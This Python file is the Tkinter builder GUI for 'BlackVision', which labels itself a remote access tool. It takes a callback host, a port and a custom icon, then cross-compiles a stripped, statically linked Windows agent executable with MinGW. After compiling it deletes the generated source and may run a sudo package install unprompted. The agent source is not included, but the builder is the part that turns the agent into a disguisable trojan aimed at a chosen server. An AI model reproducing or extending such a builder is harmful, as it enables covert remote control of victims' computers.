from server.core import *
from server.changehostnPort import *
try:
    import tkinter
except ImportError:
    print("Tkinter not found. Install tkinter and Re run.")
    exit(1)
    
from tkinter import *
from tkinter import messagebox
from tkinter import filedialog
import os

class GUI:
    def __init__(self, master):
        
        def rc_generate(filename, iconpath):
            with open(filename+".rc", "w+") as rcfile:
                rcfile.write('id ICON "'+iconpath+'"')
            if(os.name == "nt"):
                if(exeCheck("windres") == True):
                    winrescmd = "windres "+filename+".rc" +" -O coff -o "+filename+".res"
                    os.system(winrescmd)
                else:
                    print("Mingw is not properly installed or NOT availabe in PATH.")
                    print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
                    showError("Built Failed!\nMingw is not properly installed or NOT availabe in PATH.\nPlease install Mingw Compiler (http://www.mingw.org/)")
            else:
                if(exeCheck("i686-w64-mingw32-windres") == True):
                    cmd = "i686-w64-mingw32-windres "+filename+".rc" +" -O coff -o "+filename+".res"
                    os.system(cmd)


        def generate(host, port, lfilename):
            
            if(hostport(host, port) == True):
                print("Host and port changed.")
            else:
                print("Error changing host and port.")

            filename = lfilename+".exe"
            
            if(os.name == "nt"):
                if(exeCheck("g++") == True):
                    print("[+] Generating Executable..")
                    # First Change Host and Port then continue
                    wincmd = "g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
                    os.system(wincmd)
                    print("[+] File Compiled..")
                    showInfo("Build succeeded!")
                else :
                    print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
                    showError("Please install Mingw Compiler (http://www.mingw.org/)")
            else:
                if(exeCheck("i686-w64-mingw32-g++") == True):
                    print("[+] Generating Executable..")
                    cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -lwinmm -static " +lfilename+".res"
                    os.system(cmd)
                    print("[+] File Compiled..")
                    os.remove("agent/blackvision.cpp")
                    showInfo("Build succeeded!")

                else:
                    print("[+] Attempting to Install mingw..")
                    showInfo("Mingw not installed, Installing...")
                    os.system("sudo apt-get install mingw-w64")



        def showError(errormessage):
            """ Show an Error MessageBox """
            messagebox.showerror("BlackVision", errormessage)

        def showInfo(infomessage):
            """ Show an Information MessageBox """
            messagebox.showinfo("BlackVision", infomessage)

        def showWarning(warning):
            """ Show an Information MessageBox """
            messagebox.showwarning("BlackVision", warning)

        def create_file(file):
            showInfo("Please wait a few seconds..")
            filename = self.BinaryName.get()
            host = self.host.get()
            port = self.port.get()
            iconpath = self.path.get()
        
            rc_generate(filename, iconpath)
            generate(host, port, filename)

            self.output = Entry(master, bg="gray9", fg="cyan", bd="1", width=30)
            self.output.configure(font=("monospace", 10))
            self.output.pack()

            try:
                test = open(filename+".exe")
                sstr = "File Compiled! ("+filename+".exe )"
                self.output.insert(0,sstr)
            except FileNotFoundError:
                self.output.insert(0,"Compilation Failed!")


        self.heading = Label(master, text="BlackVision", fg="cornflowerblue", bg="gray9")
        self.heading.configure(font=("fixedsys", 30))
        self.heading.pack()

        self.update = Label(master, text="Remote Access.\n\nA wrapper around commands to make agent generation easy4u.", fg="light cyan", bg="gray9")
        self.update.configure(font=("fixedsys", 8))
        self.update.pack()

        self.browse = Label(master, text="Select Icon",  fg="purple", bg="gray9")
        self.browse.configure(font=("fixedsys", 8))
        self.browse.pack()

        self.path = Entry(master, width = 25)
        self.path.configure(font=("monospace", 8))
        self.path.pack()

        self.create = Label(master, text="\nA Wise choice.\n", fg="cornflowerblue", bg="gray9")
        self.create.configure(font=("monospace", 8))
        
        self.entfilname = Label(master, text="\nEnter Filename\n", fg="green", bg="gray9")
        self.entfilname.configure(font=("monospace", 8))

        self.BinaryName = Entry(master)
        self.BinaryName.configure(font=("fixedsys", 8))
        self.BinaryName.configure(font=("fixedsys", 8))
        
        self.srvhost = Label(master, text="\nEnter HOST\n", fg="green", bg="gray9")
        self.srvhost.configure(font=("monospace", 8))

        self.host = Entry(master)
        self.host.configure(font=("fixedsys", 8))
        self.host.configure(font=("fixedsys", 8))

        self.srvport = Label(master, text="\nEnter PORT\n", fg="green", bg="gray9")
        self.srvport.configure(font=("monospace", 8))

        self.port = Entry(master)
        self.port.configure(font=("fixedsys", 8))
        self.port.configure(font=("fixedsys", 8))

        self.comButton = Button(master, text="Compile", fg="dodgerblue", bg="gray9", bd="1", command = lambda: create_file(self.file.name))
        self.comButton.configure(font=("fixedsys", 8))

        def Browse():
            self.file = filedialog.askopenfile(initialdir="icons", mode="r+")
            try:
                self.path.insert(0, self.file.name)
            except AttributeError:
                print("Attribute Error. Maybe you pressed Cancel.")
            
            self.create.pack()
            self.entfilname.pack()
            self.BinaryName.pack()
            self.srvhost.pack()
            self.host.pack()
            self.srvport.pack()
            self.port.pack()
            self.comButton.pack()

        self.ButtonBrowse = Button(master, text="Browse", fg="dodgerblue", bg="gray9", bd="1", command= lambda: Browse())
        self.ButtonBrowse.configure(font=("fixedsys", 8))
        self.ButtonBrowse.pack()

def main():
    clear()

    root = Tk()
    root.title("BlackVision")
    root.configure(background="gray9")
    root.geometry("600x550")
    root.pack_propagate(0)
    app = GUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
    
